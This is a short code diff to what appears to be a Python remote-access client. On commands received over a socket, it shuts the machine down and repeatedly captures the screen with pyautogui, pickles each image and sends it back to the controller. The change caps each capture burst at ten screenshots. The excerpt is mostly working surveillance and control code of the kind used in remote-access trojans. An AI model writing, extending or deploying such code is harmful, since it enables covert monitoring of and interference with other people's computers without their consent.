@@ -65,7 +65,8 @@ while True:
                     os.system("shutdown now")
             elif command == "223":
                 screenshot_active = not screenshot_active
-                while screenshot_active:
+                screenshot_count = 0
+                while screenshot_active and screenshot_count < 10:
                     screenshot = pyautogui.screenshot()
                     img_byte_arr = io.BytesIO()
                     screenshot.save(img_byte_arr, format='PNG')
@@ -73,5 +74,7 @@ while True:
                     img_msg = pickle.dumps(img_byte_arr)
                     img_msg = bytes(f"{len(img_msg):<{HEADERSIZE}}", 'utf-8') + img_msg
                     s.send(img_msg)
+                    screenshot_count += 1
+                screenshot_active = False
             new_msg = True
             full_msg = b""
